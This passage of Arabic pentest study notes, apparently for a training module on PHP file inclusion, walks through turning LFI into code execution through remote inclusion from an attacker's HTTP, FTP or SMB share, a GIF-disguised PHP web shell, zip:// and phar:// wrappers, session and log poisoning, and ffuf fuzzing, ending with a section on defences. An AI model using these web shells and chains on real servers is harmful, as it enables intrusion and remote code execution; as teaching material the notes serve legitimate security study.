```
shell
```

بس.

---

## الطريقة الثانية

## FTP

بدل HTTP.

تشغل FTP.

ليه؟

لأن أحيانًا

```
http://
```

بيبقى متفلتر.

لكن

```
ftp://
```

مفيش حد مانعه.

---

يبقى

بدل

```
http://
```

تبقى

```
ftp://
```

وبس.

---

ولو محتاج Login

يبقى

```
ftp://user:pass@IP/shell.php
```

---

## الطريقة الثالثة

## SMB

وده خاص بويندوز.

وده جميل جدًا.

---

فى Windows

الملفات الموجودة على SMB

بتتعامل كأنها Local Files.

يعنى

```
\\192.168.1.5\share\shell.php
```

Windows يشوفه كأنه

```
C:\Folder\shell.php
```

تقريبًا.

---

يعنى تقدر تعمل

```
include(
\\Attacker-IP\share\shell.php
)
```

من غير

```
allow_url_include
```

وده أهم فرق.

---

ليه؟

لأن دى مش URL بالنسبة لويندوز.

دى UNC Path.

---

### الرسمة

```
Victim Windows

↓

include()

↓

\\192.168.1.5\share\shell.php

↓

SMB

↓

يشغل الملف
```

---

## إمتى الـ SMB يشتغل؟

غالبًا

لو أنت والسيرفر على نفس الشبكة.

مثلاً

```
Lab

VPN

HTB

شركة
```

لكن عبر الإنترنت غالبًا هيكون مقفول.

---

## الخلاصة

عندك 3 سيناريوهات رئيسية لـ RFI:

|الطريقة|البروتوكول|شرط التشغيل|
|---|---|---|
|HTTP|`http://`|يحتاج غالبًا `allow_url_include = On`|
|FTP|`ftp://`|يحتاج أيضًا `allow_url_include = On`|
|SMB|`\\IP\share\file.php`|على Windows، وغالبًا لا يحتاج `allow_url_include` لأنه يستخدم مسار UNC|

---

## ازاى تفكر كبنتريشن تيستر؟

لما تلاقي **LFI**، اسأل نفسك بالترتيب:

1. هل أقدر أقرأ `php.ini` وأشوف `allow_url_include`؟
    
2. هل التطبيق يقبل `http://` أو `ftp://`؟ (اختبر عمليًا بدل ما تعتمد على الإعدادات فقط).
    
3. لو قبل URL، أقدر أستضيف ملف PHP عندي وأخليه السيرفر يضمه؟ يبقى عندك فرصة لـ **RCE**.
    
4. لو السيرفر Windows، جرّب التفكير في **SMB/UNC paths** لأن دي طريقة مختلفة عن HTTP وFTP.
    
5. ولو لقيت إن السيرفر بيطلب صفحات داخلية مثل `127.0.0.1`، افتكر إن نفس الثغرة ممكن تساعدك كمان في استكشاف خدمات داخلية باستخدام مفاهيم **SSRF** بالإضافة إلى محاولة الوصول لتنفيذ كود.

# Layer 7
الجزء ده من أحسن أجزاء الـ LFI، لأنه بيعلمك إزاي تحول ثغرة **LFI + File Upload** إلى **RCE** حتى لو صفحة الرفع نفسها **آمنة ومفيهاش أي ثغرة**.

وده سيناريو شائع جدًا في الاختبارات العملية والـ CTFs.

---

## الفكرة الأساسية

احنا قبل كده كان عندنا LFI بس.

يعني نقدر نعمل:

```text
?page=../../../../etc/passwd
```

وده بيقرأ ملفات.

طيب...

لو فيه صفحة Upload موجودة فى الموقع؟

زى:

- تغيير صورة البروفايل
    
- رفع CV
    
- رفع ملفات
    

هنا الوضع بيختلف.

---

## الناس بتفتكر إن المشكلة فى Upload

وده غلط.

الثغرة **مش فى صفحة الرفع**.

صفحة الرفع ممكن تكون مؤمنة 100%.

مثلاً:

✅ بتسمح بـ jpg بس

✅ بتسمح بـ gif بس

✅ بتعمل Validation

✅ بتعمل Content-Type Check

وكل ده سليم.

لكن...

**المشكلة فى الـ LFI.**

---

## السيناريو

تخيل الموقع فيه:

```
Upload Image
```

بيرفعها هنا

```
/profile_images/
```

وبعدين عندك LFI

```php
include($_GET['page']);
```

إيه اللى هيحصل؟

---

## الفكرة

أنا هرفع ملف.

بس الملف مش صورة عادية.

هيكون جواه PHP.

وبعدين أخلى الـ include يقرأه.

وساعتها PHP هتنفذ الكود.

---

## ليه ده بيشتغل؟

بسبب حاجة مهمة جدًا.

الـ include مش بيبص للامتداد.

هو بيبص للمحتوى.

لو جواه

```php
<?php
```

هينفذه.

حتى لو اسم الملف

```
image.jpg
```

أو

```
cat.gif
```

---

## أول طريقة (أفضل طريقة)

## Image Upload

وده أكثر سيناريو بيحصل.

---

## الخطوة الأولى

نعمل صورة مزيفة.

بدل الصورة

هنكتب

```php
0xTroj6n@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
---

## ليه كتبنا

```
GIF8
```


دى اسمها

## Magic Bytes

كل نوع File بيبدأ بـ Signature معينة.

مثلاً

GIF

بيبدأ

```
GIF8
```

PNG

له Signature مختلفة.

JPEG

له Signature مختلفة.

---

لو صفحة الرفع بتشيك

```
هل الملف فعلاً GIF؟
```

هتشوف أول Bytes.

هتلاقى

```
GIF8
```

فتقول

```
تمام.
```

---

لكن بعدهم موجود

```php
<?php
```

وده اللى هيشتغل لما يحصل Include.

---

يبقى الملف شكله

```
GIF8

<?php system($_GET["cmd"]); ?>
```

---

## نرفعه

مثلاً

```
shell.gif
```

---

بعد الرفع

يبقى موجود هنا

```
/profile_images/shell.gif
```

---

## أعرف مكانه إزاى؟

ممكن

Inspect

وتلاقى

```html
<img src="/profile_images/shell.gif">
```

يبقى خلاص.

عرفت مكانه.

---

## بعدها

بدل

```text
?page=../../../../etc/passwd
```

هقول

```text
?page=./profile_images/shell.gif
```

ولأن

```
include()
```

بتنفذ PHP

هيشتغل

```php
system($_GET["cmd"]);
```

---

بعدها

```
&cmd=id
```

أو

```
&cmd=whoami
```

أو

```
&cmd=ls
```

ويبقى عندك

**RCE**

---

## الرسمة

```
Upload

↓

shell.gif

↓

Server

↓

LFI

↓

include(shell.gif)

↓

يشوف

<?php

↓

ينفذ

↓

RCE
```

---

## سؤال مهم

طيب هو ليه PHP نفذت الكود رغم إن الامتداد GIF؟

لأن

الـ PHP Interpreter

مش بيقول

```
ده GIF
```

هو بيقول

```
أنا بعمل include

يبقى هنفذ أى PHP Tags لقيتها.
```

وده سبب نجاح الهجوم.

---

## الطريقة الثانية

## zip Wrapper

دى خاصة بـ PHP.

---

بدل ما أرفع صورة.

هرفع

ZIP

بس أسميه

```
shell.jpg
```

يعنى شكله صورة.

لكن هو Zip.

---

جواه

```
shell.php
```

اللى فيه

```php
<?php system($_GET["cmd"]); ?>
```
![[Pasted image 20260626192101.png]]

---

بعدها

بدل

```
include(shell.jpg)
```

هستخدم

```
zip://
```

يبقى

```
zip://shell.jpg#shell.php
```

يعنى

```
افتح الـ Zip

↓

روح لملف

shell.php

↓

نفذه
```

---

## الرسمة

```
shell.jpg

↓

ZIP

↓

shell.php

↓

include()

↓

zip://

↓

يشغل shell.php
```

---

## ليه كتب

```
#shell.php
```


لأن

الـ Zip Archive

فيه أكتر من File.

فلازم تحدد أى ملف.

---

## الطريقة الثالثة

## phar Wrapper

وده Wrapper خاص بـ PHP.

---

الـ Phar

عامل زى ZIP.

لكن مخصوص لـ PHP.

---

بيكون جواه ملفات.

مثلاً

```
shell.txt
```

وجواه

```php
<?php system($_GET["cmd"]); ?>
```

![[Pasted image 20260626192310.png]]
![[Pasted image 20260626192351.png]]

---

بعدها

نعمل

```
phar://shell.jpg/shell.txt
```

لاحظ

```
/
```

مش

```
#
```

زى الـ Zip.

---

يبقى

```
Phar

↓

يفتح الأرشيف

↓

يدخل shell.txt

↓

ينفذه
```

---

## ليه سميناه

```
shell.jpg
```


عشان صفحة الرفع.

لو اسمه

```
shell.phar
```

غالبًا هترفضه.

---

## ترتيب الطرق من الأفضل للأسوأ

### الأولى

رفع صورة فيها PHP

⭐⭐⭐⭐⭐

أكثر واحدة بتنجح.

---

### الثانية

zip://

⭐⭐⭐

مش شغالة دائمًا.

---

### الثالثة

phar://

⭐⭐

أقل شوية.

---

## إمتى أستخدم كل واحدة؟

```
عندى Upload

↓

أجرب صورة فيها PHP

↓

اشتغلت؟

↓

خلصنا.

↓

لا؟

↓

أجرب zip://

↓

لا؟

↓

أجرب phar://
```

---

## نقطة مهمة جدًا للامتحانات والـ CTF

لو شفت في الموقع:

- Upload Avatar
    
- Upload Resume
    
- Upload Attachment
    
- Upload Document
    

**ومعاه LFI**...

فكر فورًا في السيناريو ده:

```
Upload

+

LFI

=

RCE
```

وده من أشهر سلاسل الاستغلال (Exploit Chains) في اختبارات الاختراق.

---

## الخلاصة

الجزء ده بيعتمد على فكرة بسيطة جدًا:

بدل ما تحاول تجيب كود PHP للسيرفر عن طريق `data://` أو `RFI`، **إنت بنفسك بتخزن الملف على السيرفر باستخدام خاصية الرفع الشرعية**، وبعدها تستغل الـ **LFI** علشان تعمل `include()` للملف المرفوع. ولو الدالة المستخدمة بتنّفذ كود (زي `include()` أو `require()`)، فالكود اللي جوا الملف هيتنفذ بغض النظر عن امتداده. ولو الطريقة المباشرة منجحتش، ممكن تلجأ إلى `zip://` أو `phar://` كبدائل في بعض تطبيقات PHP.


# Layer 8

الجزء ده يعتبر من أشهر طرق تحويل الـ **LFI → RCE**، واسمه **Log Poisoning** أو **تلويث ملفات الـ Logs**.

وده من الحاجات اللي بتتكرر كتير في الـ CTFs والـ OSCP والاختبارات العملية.

الفكرة بسيطة جدًا، لكن عبقرية.

---

## الفكرة الأساسية

إحنا عرفنا قبل كده قاعدة مهمة:

> لو `include()` قرأت أي ملف جواه كود PHP، والكود ده موجود بين `<?php ... ?>`، فـ PHP هتنفذه.

يبقى السؤال...

**إزاي أخلي كود PHP يدخل جوه ملف موجود بالفعل على السيرفر؟**

الإجابة:

**أكتب الكود في حاجة أنا متحكم فيها، والسيرفر يسجلها في Log أو Session، وبعدها أعمل Include للملف ده.**

عشان كده اسمها

**Log Poisoning**

يعني

> "ألّوث (Poison) ملف اللوج بكود PHP."

---

## الفكرة بالرسمة

```text
أنا

↓

أبعت بيانات

↓

السيرفر يسجلها

↓

Log File

↓

LFI

↓

include(Log)

↓

PHP تنفذ الكود

↓

RCE
```

---

## ليه اسمها Poisoning؟

لأن ملف اللوج الطبيعي شكله كده:

```text
GET /index.php

200 OK

Chrome
```

إنت بتخليه يبقى:

```php
GET /index.php

<?php system($_GET['cmd']); ?>

Chrome
```

يعني لوثته بكود PHP.

---

## فيه نوعين مشهورين

1. PHP Session Poisoning
    
2. Server Log Poisoning
    

هنشرحهم واحد واحد.

---

## أولًا

## PHP Session Poisoning

## الأول...

يعني إيه Session؟

كل ما تدخل موقع.

الموقع يديك Cookie.

مثلاً

```text
PHPSESSID=abc123xyz
```

وده بيتخزن عندك.

لكن البيانات نفسها مش عندك.

البيانات بتبقى على السيرفر.

---

مثلاً

```text
PHPSESSID

↓

abc123

↓

Server

↓

/var/lib/php/sessions/

↓

sess_abc123
```

---

يبقى كل Session ليها File.

اسمه

```text
sess_<PHPSESSID>
```

---

## مثال

Cookie

```text
PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd
```

يبقى الملف

```text
/var/lib/php/sessions/

sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

---

## أول خطوة

بما إن عندى LFI

أقرأ الملف.

لو ظهر

مثلاً

```text
page=es.php

preference=es
```

يبقى جميل.

---

## السؤال المهم

مين فيهم أقدر أتحكم فيه؟

لو لقيت

```text
page=
```

جاي من

```text
?language=
```

يبقى أنا متحكم فيه.

---

مثلاً

أزور

```text
?language=test123
```

وبعدين أقرأ الـ Session.

ألاقى

```text
page=test123
```

يبقى تمام.

![[Pasted image 20260626195340.png]]

---

## يبقى الخطوة الجاية؟

بدل

```text
test123
```

هكتب

```php
<?php system($_GET["cmd"]); ?>
```

بس URL Encoded.

يعنى بدل

```php
<?php
```

تبقى

```text
%3C%3Fphp
```

---

السيرفر هيخزنها فى الـ Session.

يبقى الملف بقى

```php
page=<?php system($_GET["cmd"]); ?>
```

---

بعدها

أعمل Include للـ Session.

```text
LFI

↓

include(sess_xxx)

↓

يشوف

<?php

↓

ينفذ

↓

RCE
```

---

بعدها

```text
&cmd=id
```

أو

```text
&cmd=whoami
```

وهكذا.

---

## ليه لازم أعيد Poisoning كل مرة؟

لأن الـ Session File بيتحدث باستمرار.

كل Request جديد.

البيانات القديمة ممكن تتشال.

فالكود يختفى.

---

عشان كده غالبًا أول حاجة بتعملها بعد ما تنفذ كود...

تكتب Web Shell دائم.

---

## ثانيًا

## Server Log Poisoning

وده أشهر نوع.

---

كل Web Server بيكتب Logs.

مثلاً

Apache

بيكتب

```text
access.log
```

و

```text
error.log
```

---

الـ access.log

بيسجل كل Request.

مثلاً

```text
IP

GET /index.php

Status

User-Agent
```

---

مين المتحكم فى الـ User-Agent؟

إنت.

---

مثلاً بدل

```text
Chrome
```

أبعت

```php
<?php system($_GET["cmd"]); ?>
```
![[Pasted image 20260626194743.png]]

---

السيرفر هيكتبها فى اللوج.

يبقى اللوج بقى

```text
GET /

200

<?php system($_GET["cmd"]); ?>
```

---

بعدها

نعمل

```text
LFI

↓

include(access.log)

↓

يشوف

<?php

↓

يشغلها

↓

RCE
```

---

## الرسمة

```text
Request

↓

User-Agent

↓

Apache

↓

access.log

↓

LFI

↓

include()

↓

PHP Execute
```

---

## فين اللوجات؟

## Apache

Linux

```text
/var/log/apache2/
```

Windows

```text
C:\xampp\apache\logs\
```

---

## Nginx

Linux

```text
/var/log/nginx/
```

Windows

```text
C:\nginx\log\
```

---

## ليه Nginx أسهل؟

لأن غالبًا

```text
www-data
```

يقدر يقرأ اللوج.

---

أما Apache

غالبًا

```text
root
```

أو

```text
adm
```

بس.

فمش دايمًا هينفع.

---

## إزاى أحقن User-Agent؟

بـ Burp.

أو

curl.

الفكرة مش في الأداة.

الفكرة إن أي قيمة بتتحط في `User-Agent` هتتسجل في اللوج.

---

## حاجة ذكية جدًا

مش لازم تسمم Request بتاعة الـ LFI.

أي Request للموقع هيتكتب.

يعنى

```text
/

login

about

contact
```

كلهم بيتسجلوا.

---

## حاجة تانية

مش بس الـ User-Agent.

أي Header بيتسجل.

أو أي قيمة اللوج بيكتبها.

---

## /proc

فى لينكس

فيه

```text
/proc/self/environ
```

وده بيحتوى

Environment Variables.

من ضمنهم

```text
User-Agent
```

لو السيرفر بيسمح تقرأه.

تقدر تعمل نفس الفكرة.

---

## كمان

```text
/proc/self/fd/
```

دى

File Descriptors.

أحيانًا تلاقى اللوج مفتوح هناك.

---

## هل فيه Logs تانية؟

آه.

أى Service بتعمل Logging.

مثلاً

SSH

```text
/var/log/sshd.log
```

---

FTP

```text
/var/log/vsftpd.log
```

---

Mail

```text
/var/log/mail
```

---

لو أنت متحكم فى Username مثلاً.

تبعت

```php
<?php ... ?>
```

كـ Username.

---

السيرفر هيكتبها فى اللوج.

---

وبعدين

```text
LFI

↓

include(log)

↓

RCE
```

---

## ازاي تفكر كبنتريشن تيستر؟

بعد ما تثبت إن عندك **LFI**، اسأل نفسك:

1. هل أقدر أقرأ ملفات الـ Session؟
    
2. هل فيه قيمة في الـ Session أنا متحكم فيها؟
    
3. هل أقدر أقرأ `access.log` أو `error.log`؟
    
4. هل أقدر أتحكم في حاجة بتتسجل هناك زي `User-Agent` أو `Referer` أو غيرهم؟
    
5. هل فيه خدمات تانية (SSH / FTP / Mail) بتكتب بيانات أنا أقدر أتحكم فيها، ولو آه، هل أقدر أقرأ اللوج بتاعها؟
    

لو إجابة أي سؤال من دول "آه"، فكر في **Poisoning → Include → Code Execution**.

---

## ملخص جميع طرق تحويل LFI إلى RCE

```text
LFI
│
├── PHP Wrappers
│   ├── data://
│   ├── php://input
│   └── expect://
│
├── RFI
│   ├── HTTP
│   ├── FTP
│   └── SMB
│
├── File Upload
│   ├── Image Upload
│   ├── zip://
│   └── phar://
│
└── Log Poisoning
    ├── PHP Session
    ├── Apache access.log
    ├── Nginx access.log
    ├── /proc/self/environ
    └── SSH / FTP / Mail Logs
```

لو فهمت الشجرة دي كويس، يبقى أنت استوعبت تقريبًا كل أشهر الطرق اللي بيتحول بيها **LFI** إلى **RCE** في تطبيقات الويب.
# Layer 9
الجزء ده بيتكلم عن **Automating LFI**، يعني بعد ما اتعلمنا نستغل الـ LFI يدويًا، إزاي نستخدم أدوات زي **ffuf** و **Wordlists** عشان نسرع الشغل.

---

## ليه نستخدم Automation؟

طول الموديول كنا بنكتب Payloads بإيدينا.

زي:

```text
../../../../etc/passwd
```

أو

```text
php://filter/...
```

وده مهم جدًا.

لكن فى اختبار حقيقى ممكن يبقى عندك:

- 200 Parameters
    
- 500 Pages
    
- أكتر من Web Application
    

مستحيل تجرب كل حاجة يدوي.

هنا بنستخدم Automation.

---

## لكن خد بالك

الموديول بيأكد على نقطة مهمة جدًا:

> الأدوات **بتساعد**، لكنها **مش بديل للفهم**.

لأن أحيانًا الـ Payload اللى هيشتغل هيكون Custom، ومش موجود فى أى Wordlist.

---

## أول حاجة

## Fuzzing Parameters

أوقات كتير الموقع بيبقى فيه Parameter مش ظاهر.

مثلاً الصفحة:

```text
index.php
```

أنت شايف

```text
?page=home
```

لكن فى الحقيقة فيه كمان

```text
?language=
```

أو

```text
?template=
```

أو

```text
?view=
```

وأنت متعرفهمش.

---

يبقى أول خطوة

نفززر أسماء الـ Parameters.

---

مثلاً باستخدام ffuf

الفكرة:

```text
FUZZ=value
```

ويجرب

```
page
file
template
language
include
view
...
```

لحد ما يلاقى Parameter موجود.

لو لقى

```text
language
```

يبقى خلاص.

بعدها تبدأ تختبر عليه LFI.


```java
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

---

## طريقة التفكير

```text
Website

↓

Fuzz Parameters

↓

لقيت

language

↓

اختبر LFI
```

---

## بعد كده

## LFI Wordlists

بدل ما أجرب

```text
../../../../etc/passwd
```

بإيدى.

فى Wordlist فيها مئات الـ Payloads.

مثلاً

```
../../../../etc/passwd

..%2F..%2Fetc/passwd

/%2e%2e/%2e%2e/

...
```

كلها بتتجرب لوحدها.

ولو واحدة نجحت

ffuf هيطلعها.

```java
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

---

## أشهر Wordlist

```
LFI-Jhaddix.txt
```

وده من أشهر Wordlists للـ LFI.

ليه؟

لأنه فيه:

- Traversal Payloads
    
- URL Encoding
    
- Double Encoding
    
- Bypasses
    
- Common Files
    

---

## الرسمة

```text
Parameter

↓

Wordlist

↓

1000 Payload

↓

واحدة اشتغلت

↓

LFI
```

---

## بعد كده

## Fuzzing Server Files

نفترض إنك عرفت إن عندك LFI.

طيب تقرأ إيه؟

هل تحفظ كل Paths؟

مستحيل.

هنا الـ Wordlists تساعدك.

---

مثلاً تدور على

```
/etc/passwd
```

```
/etc/hosts
```

```
/etc/apache2/apache2.conf
```

```
php.ini
```

```
access.log
```

كلهم موجودين فى Wordlists.

---

## أول حاجة

## Server Webroot

أوقات تحتاج تعرف

الموقع متسطب فين.

مثلاً

```
/var/www/html
```

ليه؟

علشان لو رفعت File.

وتحتاج توصله.

أو عايز تعرف مكان

```
index.php
```

فتعمل Fuzz على أشهر Webroots.

لو رجع

```
/var/www/html/
```

يبقى ده الـ Document Root.


```java
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

---

## بعد كده

## Server Configurations

من أحسن الملفات اللى تقراها

```
apache2.conf
```

ليه؟

لأنه بيقولك:

- Document Root
    
- Logs
    
- Modules
    
- Virtual Hosts
    

---

مثلاً تلاقى

```apache
DocumentRoot /var/www/html
```

أو

```apache
CustomLog ${APACHE_LOG_DIR}/access.log
```

بس هنا ظهر متغير:

```
APACHE_LOG_DIR
```

مش Path مباشر.

---

## أروح فين؟

أقرأ

```
/etc/apache2/envvars
```

هتلاقى

```bash
APACHE_LOG_DIR=/var/log/apache2
```

يبقى استنتجنا إن

```
access.log
```

موجود فى

```
/var/log/apache2/access.log
```

وده نفس اللوج اللى استخدمناه فى Log Poisoning.

---

## دى نقطة مهمة جدًا

لاحظ طريقة التفكير.

إحنا مش بنقرأ ملفات عشوائى.

إحنا بنقرأ ملف...

علشان يودينا لملف تانى.

مثلاً

```
apache2.conf

↓

لقى APACHE_LOG_DIR

↓

envvars

↓

عرف مكان اللوج

↓

Log Poisoning
```

دى اسمها

**Information Chaining**

أو

**Attack Chain**

وده أسلوب مهم جدًا فى البنتست.

---

## آخر جزء

## LFI Tools

بدل ما تستخدم ffuf بس.

فى Tools متخصصة.

زى

- LFISuite
    
- LFiFreak
    
- liffy
    

بتحاول تعمل:

- اكتشاف LFI
    
- تجربة Payloads
    
- قراءة ملفات
    
- أحيانًا محاولة RCE
    

لكن المؤلف بيقول نقطة مهمة:

> أغلب الأدوات دى قديمة، ومبنية على Python 2، ومش دايمًا هتشتغل كويس على الأنظمة الحديثة.

---

## ازاى أفكر كبنتريشن تيستر؟

بدل ما تمشى عشوائى، امشى بالترتيب ده:

```text
1. Fuzz Parameters
        │
        ▼
2. اكتشف Parameter مخفى
        │
        ▼
3. جرّب LFI Payloads (Wordlist)
        │
        ▼
4. لو لقيت LFI
        │
        ▼
5. دور على Webroot
        │
        ▼
6. اقرأ ملفات الـ Config
        │
        ▼
7. استخرج أماكن الـ Logs والـ Uploads
        │
        ▼
8. جرّب Log Poisoning أو File Upload أو Wrappers
        │
        ▼
9. RCE
```

---

## ملخص موديول الـ LFI بالكامل

بعد الموديول ده، المفروض يبقى عندك الخريطة الذهنية دى:

```text
LFI
│
├── Path Traversal
│
├── Encoding & Bypass
│
├── PHP Filters
│
├── PHP Wrappers
│   ├── data://
│   ├── php://input
│   ├── expect://
│   ├── zip://
│   └── phar://
│
├── RFI
│   ├── HTTP
│   ├── FTP
│   └── SMB
│
├── File Upload → LFI → RCE
│
├── Log Poisoning
│   ├── PHP Session
│   ├── Apache/Nginx Logs
│   ├── /proc
│   └── Service Logs
│
└── Automation
    ├── Parameter Fuzzing
    ├── LFI Wordlists
    ├── Webroot Discovery
    ├── Config Discovery
    └── LFI Tools
```

لو استوعبت الخريطة دي كويس، فأنت مش هتبقى حافظ Payloads وخلاص، لكن هتبقى فاهم **إزاي تبدأ من LFI وتفكر خطوة بخطوة لحد ما توصل لـ RCE** في سيناريوهات مختلفة.

# Layer 10
وده آخر جزء في الموديول، وبيتكلم عن **إزاي نحمي التطبيق من ثغرات الـ File Inclusion**. الجميل فيه إنه بيخليك تفكر كـ **Developer** أو **Security Engineer** بدل ما تكون Pentester بس.

---

## الهدف من الجزء ده

إحنا اتعلمنا خلال الموديول كله إزاي نستغل:

- LFI
    
- RFI
    
- PHP Wrappers
    
- Log Poisoning
    
- File Upload
    
- RCE
    

طيب لو أنا Developer...

أمنع الكلام ده إزاي؟

---

## أول حاجة

## 1) متخليش User Input يدخل لـ include()

دى أهم نقطة فى الموديول كله.

تخيل عندك

```php
include($_GET['page']);
```

دى كارثة.

لأن المستخدم بقى هو اللى بيحدد الملف.

---

المفروض يبقى كده

بدل

```text
?page=home.php
```

يبقى

```text
?page=1
```

وبعدين

السيرفر يعمل Mapping

مثلاً

```php
$pages = [
1=>"home.php",
2=>"about.php",
3=>"contact.php"
];

include($pages[$_GET['page']]);
```

لاحظ الفرق.

المستخدم مبقاش بيبعت اسم الملف.

هو بيبعت رقم بس.

والسيرفر هو اللى يحدد الملف.

---

## الرسمة

❌ غلط

```text
User

↓

home.php

↓

include()
```

---

✅ صح

```text
User

↓

1

↓

Lookup

↓

home.php

↓

include()
```

---

## ليه الطريقة دى آمنة؟

لأن حتى لو كتب

```text
../../../../etc/passwd
```

مش هيتلاقى فى الـ Mapping.

فيرجع

Default Page.

---

## دى اسمها

**Whitelist**

يعنى قائمة مسموح بيها فقط.

---

## 2) استخدم Whitelist

بدل ما أقول

```text
أي Input مقبول
```

أقول

```text
المسموح

home

about

contact
```

بس.

أى حاجة تانية

ترفض.

---

## مثال

```php
switch($page){

case "home":

include("home.php");

break;

case "about":

include("about.php");

break;

default:

include("404.php");

}
```

حتى لو المستخدم كتب

```text
/etc/passwd
```

هيطلعله

```text
404
```

---

## 3) امنع Directory Traversal

احنا كنا بنعمل

```text
../../../../etc/passwd
```

وده اسمه

Directory Traversal.

---

إزاى أمنعه؟

فى PHP فيه Function جاهزة

اسمها

```php
basename()
```

---

مثال

لو دخل

```text
../../../../etc/passwd
```

تعمل

```php
basename("../../../../etc/passwd")
```

هترجع

```text
passwd
```

بس.

تشيل كل الـ Path.

---

يعنى

بدل

```text
../../../../etc/passwd
```

يبقى

```text
passwd
```

---

وده يمنع Traversal.

---

## ليه قال متعملهاش بنفسك؟

لأن ممكن تنسى Edge Case.

مثلاً

هو ورالك مثال غريب.

فى Bash

```bash
.?/.*/.?/
```

أحيانًا تتعامل زى

```text
../
```

فى ظروف معينة.

لو أنت كاتب Function بنفسك.

ممكن متعرفش الحالة دى.

لكن

```php
basename()
```

اتعملت بواسطة ناس متخصصين.

واتجربت سنين.

---

## 4) شيل ../

لو مضطر تستقبل Path.

اعمل Sanitization.

مثلاً

```php
while(substr_count($input,"../")){

$str = str_replace("../","",$str);

}
```

الفكرة

كل ما يلاقى

```text
../
```

يشيلها.

---

ليه عامل

while

مش

if

؟

لأن

لو المستخدم كتب

```text
../../../../
```

هيشيل واحدة.

يفضل

```text
../../../
```

لازم يكمل.

لحد ما ميبقاش فيه ولا

```text
../
```

---

## الرسمة

```text
../../../../etc/passwd

↓

إزالة ../

↓

etc/passwd
```

---

## 5) اقفل RFI

احنا استغلينا

```text
http://

ftp://

data://
```

ليه؟

لأن

```ini
allow_url_include = On
```

---

الحل؟

اقفلها.

```ini
allow_url_include=Off
```

وكمان

```ini
allow_url_fopen=Off
```

---

يبقى

```text
http://evil.com/shell.php
```

مش هيشتغل.

---

## 6) امنع الوصول خارج Web Root

احنا كنا بنقرأ

```text
/etc/passwd
```

و

```text
/var/log/apache2
```

ليه؟

لأن PHP كانت تقدر توصل لكل الهارد.

---

الحل

```ini
open_basedir=/var/www
```

يعنى

PHP متطلعش بره

```text
/var/www
```

خالص.

---

## الرسمة

بدون

open_basedir

```text
/

├── etc

├── var

├── home

└── www
```

PHP تشوف كله.

---

مع

open_basedir

```text
/var/www
```

بس.

---

حتى لو عندك LFI.

مش هتعرف تقرأ

```text
/etc/passwd
```

---

## 7) اقفل Modules الخطيرة

زى

```text
Expect
```

اللى استخدمناه.

لو مش محتاجه.

اعمله Disable.

---

كل Module زيادة

يعنى

Attack Surface أكبر.

---

## 8) استخدم Docker

الموديول ذكر Docker.

ليه؟

لأن التطبيق يبقى جوه Container.

حتى لو اخترقته.

هيفضل جوه الـ Container.

مش يشوف الجهاز كله.

---

## الرسمة

بدون Docker

```text
Server

├── Website

├── Logs

├── SSH

├── Users

└── System
```

---

مع Docker

```text
Container

└── Website فقط
```

---

فالضرر يقل جدًا.

---

## 9) استخدم WAF

زى

ModSecurity.

---

الـ WAF

واقف قدام الموقع.

كل Request

تعدى عليه الأول.

---

لو شاف

```text
../../../../
```

يقول

```text
دى Traversal.
```

ويمنعها.

---

لو شاف

```text
php://filter
```

يمنعها.

---

لو شاف

```text
expect://
```

يمنعها.

---

## الرسمة

```text
Attacker

↓

WAF

↓

Website
```

---

## ليه قال متشغلوش Block على طول؟

لأن

ممكن يمنع Users طبيعيين.

دى اسمها

False Positive.

---

ففى الأول

يشغلوه

```text
Detection Mode
```

أو

```text
Permissive Mode
```

---

يعنى

يسجل الهجمات.

لكن ميمنعهاش.

---

بعد ما يتأكدوا إن الـ Rules سليمة.

يشغلوه

```text
Blocking Mode
```

---

## آخر نقطة مهمة جدًا

## Hardening مش معناه إن الموقع مستحيل يتهكر

وده من أهم كلام الموديول.

ناس كتير بتفتكر

```text
ركبت WAF

قفلت RFI

قفلت Wrappers

يبقى خلاص.
```

لأ.

لسه ممكن يحصل

Zero-Day

أو

Bypass

أو

Logic Bug.

---

فالـ Hardening هدفه

مش

```text
منع الاختراق 100%
```

لأن ده مستحيل.

---

هدفه

```text
يصعب الاختراق

↓

يخلى المهاجم يسيب Logs أكتر

↓

يدى فرصة للـ Blue Team يكتشف الهجوم قبل ما يكمل.
```

---

## الخلاصة

لو كنت مسؤول عن تأمين تطبيق ويب، فكر بالترتيب ده:

```text
امنع المستخدم من التحكم في اسم الملف
        │
        ▼
استخدم Whitelist بدل إدخال مباشر
        │
        ▼
امنع Directory Traversal (مثل basename)
        │
        ▼
اعمل Sanitization للمدخلات
        │
        ▼
اقفل RFI (allow_url_include = Off)
        │
        ▼
قيّد الوصول للملفات (open_basedir أو Containers)
        │
        ▼
اعطّل الـ Modules غير الضرورية
        │
        ▼
استخدم WAF للمراقبة والحماية
        │
        ▼
راقب الـ Logs باستمرار واختبر التطبيق دوريًا
```

## أهم فكرة تطلع بيها من الموديول كله

كمهاجم (Pentester)، كنت بتسأل:

> **"إزاي أخلي المستخدم يتحكم في الملف اللي هيتعمله include؟"**

أما كمدافع (Developer أو Security Engineer)، فالسؤال بيتحول إلى:

> **"إزاي أتأكد إن المستخدم عمره ما يقدر يحدد الملف اللي هيتعمله include، وحتى لو حصلت ثغرة، يكون تأثيرها محدود جدًا؟"**

وده هو جوهر تأمين ثغرات **File Inclusion**.